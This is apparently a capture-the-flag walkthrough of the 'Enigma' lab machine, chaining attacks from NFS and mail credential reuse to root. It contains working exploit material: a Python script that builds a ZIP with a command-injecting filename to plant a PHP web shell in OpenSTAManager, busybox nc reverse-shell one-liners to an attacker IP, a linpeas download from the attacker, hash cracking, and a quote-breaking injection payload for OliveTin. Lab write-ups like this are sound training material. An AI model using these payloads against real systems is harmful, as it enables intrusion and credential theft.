# Enigma: Easy

```sh
sudo vim /etc/hosts
# add enigma.htb

nmap -T4 -p- -A -Pn -v enigma.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
    * 80/tcp: http: nginx 1.24.0
    * 110/tcp: pop3: Dovecot pop3d
    * 111/tcp: rpcbind
    * 143/tcp: imap: Dovecot imapd
    * 993/tcp: ssl/imap: Dovecot imapd
    * 995/tcp: ssl/pop3: Dovecot pop3d
    * 2049/tcp: nfs_acl
    * 39077/tcp: mountd
    * 39725/tcp: nlockmgr
    * 40217/tcp: status
    * 43117/tcp: mountd
    * 57819/tcp: mountd

* the webpage on port 80 is for 'EnigmaCorp: Managed IT Solutions', and the website contains generic content

* the footer includes an email: 'support@enigma.htb': and there are no outgoing links on this webpage

* enumerating NFS:

    ```sh
    showmount -e enigma.htb
    # this gives export list - '/srv/nfs/onboarding *'

    sudo mkdir /mnt/onboarding
    # create dir for mounting

    sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt/onboarding -o nolock
    # mount the directory

    cd /mnt/onboarding

    ls -la
    # PDF file found

    sudo umount /mnt/onboarding
    # unmount the directory once done
    ```

    * the ```showmount``` command shows a directory ```/srv/nfs/onboarding``` - we can mount and check further

    * we can mount the directory using ```mount```, and access it

    * accessing it gives us a file 'New_Employee_Access.pdf'

* from the PDF file in the mounted directory, we get the following info:

    * we get a webmail access URL at 'http://mail001.enigma.htb' with creds 'kevin:Enigma2024!', for user 'Kevin Mitchell'
    
    * we have another support email at 'it@enigma.htb'

* update the mail subdomain in ```/etc/hosts``` and access the webpage at 'http://mail001.enigma.htb'

* this leads us to a login page for Roundcube Webmail: and we can use the above creds to login

* in the inbox page, we have one email from 'sarah@enigma.htb': the mail does not disclose any creds, but it mentions that the access credentials would be provided in the company shared drive

* checking the version info in the About section shows the version info: Roundcube Webmail 1.6.16; and also provides plugin versions:

    * archive: 3.5
    * filesystem_attachments: 1.0
    * jqueryui: 1.13.2
    * zipdownload: 3.4

* Googling for exploits associated with any of these versions does not give anything useful

* we can try using these creds to login via SSH, but it does not work: we get the same 'Permission denied (publickey)' errors for multiple usernames

* at this stage, we can try password reuse for user 'sarah' in Roundcube Webmail, since there is a possibility that the default password may not have been changed

* if we logout from our session as 'kevin', and try the creds 'sarah:Enigma2024!', it works surprisingly and we have access as 'sarah' now

* there is only one mail in Inbox with the subject 'OpenSTAManager Access Request', and it provides the URL 'http://support_001.enigma.htb', with the creds 'admin:Ne3s4rtars78s'

* update the subdomain in ```/etc/hosts```, and access the new subdomain

* this support subdomain leads to the login page for OpenSTAManager: an open source management software for technical assistance & electronic invoicing

* the creds work, and we have access to the dashboard page for OpenSTAManager; in the Info page, we get the version 2.9.8

* searching for exploits associated with this release gives us multiple vulns:

    * [CVE-2026-24417: time-based SQL injection](https://github.com/advisories/GHSA-4hc4-8599-xh2h)
    * [CVE-2026-27012: unauthenticated privilege escalation of user accounts](https://github.com/devcode-it/openstamanager/security/advisories/GHSA-247v-7cw6-q57v)
    * [CVE-2025-69212: OS command injection](https://github.com/advisories/GHSA-25fp-8w8p-mx36)
    * [CVE-2025-69213: SQL injection](https://www.sentinelone.com/vulnerability-database/cve-2025-69213/)

* we can try the OS command injection exploit first as it can lead to RCE: we can follow the POC given in the advisory:

    * create malicious ZIP file:

        ```sh
        vim createzip.py

        python3 createzip.py
        # creates exploit.zip
        ```

        ```py
        import zipfile

        cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
        malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

        with zipfile.ZipFile('exploit.zip', 'w') as zf:
            zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
        ```
    
    * in the OpenSTAManager dashboard page, navigate to Sales > Sales invoices: and click on the 'Importazione FE' option

    * here, we have a file upload option: upload the 'exploit.zip' file and submit

    * the upload gives an error: "Start tag expected, '<' not found"

    * however, the shell file is uploaded and we can confirm RCE using ```curl```:

        ```sh
        curl 'http://support_001.enigma.htb/files/SHELL.php?c=id'
        # 'www-data'
        ```
    
    * using a revshell one-liner, we can get reverse shell:

        ```sh
        nc -nvlp 4444
        # setup listener

        curl 'http://support_001.enigma.htb/files/SHELL.php?c=busybox+nc+10.10.14.52+4444+-e+sh'
        # this works
        ```

* in reverse shell:

    ```sh
    id
    # 'www-data' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/var/www/html/openstamanager/files'

    ls -la /

    ls -la /home
    # we have 4 users
    # but no read access

    su kevin
    # try to switch to any of the users using password reuse fails
    ```

* checking the ```/home``` directory shows we have 4 users: 'haris', 'it', 'kevin', and 'sarah': but we do not have any read access

* we can try switching users using ```su``` and the previously found passwords, but it does not work

* enumerate the files further for any secrets:

    ```sh
    ls -la /var

    ls -la /var/www
    # check all web-related files
    # we have 2 folders here - 'html' and 'olivetin'

    ls -la /var/www/html
    # check for any secrets

    ls -la /var/www/html/main

    ls -la /var/www/html/roundcube
    # check for any config files

    ls -la /var/www/html/roundcube/config

    cat /var/www/html/roundcube/config/config.inc.php
    # this file contains creds

    ls -la /var/www/html/openstamanager
    # check config files

    cat /var/www/html/openstamanager/config.inc.php
    # contains creds

    ls -la /var/www/olivetin

    cat /var/www/olivetin/index.html

    ls -la /var/www/olivetin/assets
    ```

* the web files provide a lot of info:

    * the RoundCube config file at ```/var/www/html/roundcube/config/config.inc.php``` gives MySQL DB creds 'roundcube:Yo270x26!gTx02' and encryption key 'mUW4idQIgKeYum1hcONJCkCR'

    * the OpenSTAManager config file ```/var/www/html/openstamanager/config.inc.php``` contains MySQL DB creds 'brollin:Fri3nds@9099'

    * there is another directory named 'olivetin': checking the web files does not give any secrets

* Googling for OliveTin leads to [OliveTin: a webapp for predefined shell commands](https://github.com/OliveTin/OliveTin)

* we can continue enumerating the system for any other files:

    ```sh
    ls -la /

    ls -la /opt
    # contains two files

    cat /opt/roundcube
    # this does not show anything useful

    ls -la /opt/OliveTin
    # OliveTin installation dir

    ls -la /opt/OliveTin/OliveTin-linux-amd64/
    # contains some files owned by user 'kevin'
    # check for any secrets

    cat /opt/OliveTin/OliveTin-linux-amd64/Dockerfile

    cat /opt/OliveTin/OliveTin-linux-amd64/config.yaml
    ```

* the OliveTin installation directory is found in ```/opt```, and there are some files owned by user 'kevin'

* checking the Dockerfile at ```/opt/OliveTin/OliveTin-linux-amd64/Dockerfile``` shows the webapp is running on TCP port 1337

* the config file at ```/opt/OliveTin/OliveTin-linux-amd64/config.yaml``` contains a commented out password hash: ```$argon2id$v=19$m=65536,t=4,p=2$puyxA0s555TSFx7hnFLCXA$PyhLGpZtvpMMvc2DgMWkM8OJMKO55euwV5gm//1iwx4``` for an admin with username 'alice': we can check this later

* we can try checking the MySQL DBs for any other creds:

    ```sh
    mysql -u roundcube -p'Yo270x26!gTx02' -e 'show databases'
    # check using RoundCube creds
    # this shows 'roundcubemail' DB

    mysql -u roundcube -p'Yo270x26!gTx02' -D roundcubemail -e 'show tables'

    mysql -u roundcube -p'Yo270x26!gTx02' -D roundcubemail -e 'select * from users'
    # check 'users' table
    # this shows only two users - 'kevin' and 'sarah' - and no passwords

    mysql -u brollin -p'Fri3nds@9099' -e 'show databases'
    # check using OpenSTAManager creds

    mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e 'show tables'
    # check for user-related tables

    mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e 'select * from an_anagrafiche'

    mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e 'select * from zz_users'
    # this contains hashes for 'admin' and 'haris'
    ```

* the RoundCube MySQL DB does not give any secrets

* Googling for OpenSTAManager DB and its users table shows two table names: 'an_anagrafiche' & 'zz_users': so we can check these tables

* the 'zz_users' table contains hashes for users 'admin' & 'haris'

* as the 'admin' password is already known, we can try cracking the hash for 'haris'

* the hash is in bcrypt format: we can use ```hashcat``` mode 3200:

    ```sh
    vim harishash
    # paste hash

    hashcat -a 0 -m 3200 harishash /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` cracks the hash to give cleartext 'bestfriends'

* we can try logging in via SSH as 'haris':

    ```sh
    ssh haris@enigma.htb
    # this fails
    ```

* SSH fails, but we can try switching users in reverse shell using ```su```:

    ```sh
    # in reverse shell

    su haris
    # this works
    ```

* we have RCE as 'haris' now:

    ```sh
    cd

    ls -la
    # check all files

    cat user.txt
    # user flag

    sudo -l
    # this does not work
    ```

* we can try further enum using ```linpeas``` - fetch script from attacker:

    ```sh
    wget http://10.10.14.52:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-124-generic, Ubuntu 24.04.4
    * sudo version 1.9.15p5
    * list of local-only listeners includes non-default ports 876 and 1337

* as the OliveTin webapp is likely running on localhost port 1337, we can check that service for further info

* however, first we need to do local port forwarding: we can do that via SSH, but we need to create authorized keys for user 'haris' first:

    ```sh
    # on attacker

    ssh-keygen -f haris

    chmod 600 haris
    
    cat haris.pub
    # copy pubkey contents
    ```

    ```sh
    # in reverse shell

    cd

    mkdir .ssh

    cd .ssh

    echo "ssh-ed25519..." > authorized_keys
    # paste the pubkey contents

    chmod 600 authorized_keys
    ```

    ```sh
    # now we can SSH as 'haris'

    ssh -i haris haris@enigma.htb
    # this works
    ```

* as SSH is working, we can setup local port forwarding next:

    ```sh
    ssh -i haris -L 1234:localhost:1337 haris@enigma.htb
    ```

* now we can access the OliveTin web service on attacker port 1234

* navigating to 'http://localhost:1234' leads to the OliveTin dashboard, where multiple actions are shown

* the footer section shows the version OliveTin 3000.10.0 and the status is 'Connected'

* Googling for exploits associated with OliveTin 3000.10.0 leads to [CVE-2026-27626: a OS command injection vuln with both authenticated and unauthenticated methods](https://nvd.nist.gov/vuln/detail/CVE-2026-27626)

* the vulnerability page also links to a [GitHub advisory for CVE-2026-27626, where a POC is provided](https://github.com/OliveTin/OliveTin/security/advisories/GHSA-49gm-hh7w-wfvf)

* we can attempt the unauthenticated webhook POC to check for RCE:

    ```sh
    curl -X POST http://localhost:1234/webhook/git-deploy -H "Content-Type: application/json" -d '{"git_message": "x; id #", "git_author": "attacker"}'
    # this does not work

    # we can modify the endpoint to '/webhooks' - as the docs suggest this is the actual endpoint
    curl -X POST http://localhost:1234/webhooks/git-deploy -H "Content-Type: application/json" -d '{"git_message": "x; id #", "git_author": "attacker"}'
    # this also does not work
    ```

* the unauthenticated RCE does not work regardless of the command

* we can test for authenticated RCE next but we need valid creds

* from the config file for OliveTin, at ```/opt/OliveTin/OliveTin-linux-amd64/Dockerfile```, we had found a 'argon2id' hash for the username 'alice': we can try to crack that hash

* as 'argon2id' is a newer hash format, we need to use an updated version of ```hashcat``` to crack it: as mode 34000 supports it:

    ```sh
    # download the latest hashcat release from its github page

    7z x hashcat-7.1.2.7z
    # extract file contents

    cd hashcat-7.1.2

    ./hashcat.bin -I
    # verify version

    vim alicehash
    # paste argon2id hash

    ./hashcat.bin -a 0 -m 34000 alicehash /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` cracks the hash to give us the cleartext 'password': however the creds 'alice:password' do not work for the OliveTin login

* trying to use other creds also does not work

* checking for any other config files for OliveTin leads to a different location: at ```/etc/OliveTin/config.yaml```

* both config files contain the same default entries, but ```/etc/OliveTin/config.yaml``` contains an additional config for an action 'Backup Database':

    ```yaml
    - title: Backup Database
        id: backup_database
        icon: "⛁"
        shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
        popupOnStart: execution-dialog
        arguments:
        - name: db_user
            type: ascii_identifier
            default: backup_svc
        - name: db_pass
            type: password
        - name: db_name
            type: ascii_identifier
            default: production
    ```

* this indicates there is a non-default action 'Backup Database' with id 'backup_database' for OliveTin

* we can confirm this by navigating to the OliveTin homepage, where the 'Backup Database' action is present at the end

* for this particular action, the shell command ```mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql``` is executed

* here, as single-quotes are used, we can try command injection using single quotes for the 'db_pass' value:

    * setup a ping listener on attacker using ```sudo tcpdump -i tun0 icmp```

    * now, navigate to the 'Backup Database' action on OliveTin: this leads to a form with the 3 argument fields: 'db_user', 'db_pass', and 'db_name'

    * we can try injecting our command in the 'db_pass' field, using a payload such as ```'; ping -c 3 10.10.14.52;'```

    * this payload works as we can see ICMP packets on our listener

    * we can use a similar payload to get reverse shell

    * setup listener using ```nc -nvlp 5555```

    * in the 'db_pass' field, submit the payload with revshell one-liner: ```'; busybox nc 10.10.14.52 5555 -e sh;'```

    * this works and we get a reverse shell connection

    * the reverse shell times out within a few seconds, so we need to quickly run our command to get the root flag: ```cat /root/root.txt``` - this works
